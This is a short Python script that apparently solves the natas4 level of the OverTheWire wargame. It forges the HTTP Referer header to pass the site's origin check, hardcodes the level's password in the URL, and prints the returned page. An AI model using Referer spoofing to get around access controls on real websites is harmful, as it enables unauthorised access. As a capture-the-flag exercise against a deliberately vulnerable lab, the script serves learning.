import requests

target = 'http://natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ@natas4.natas.labs.overthewire.org'
header = {'Referer':'http://natas5.natas.labs.overthewire.org/'}

r = requests.get(target,headers=header)
if r.status_code != requests.codes.ok :
	print 'Unable to Connect'
else :
	print 'Connected'
	
print r.content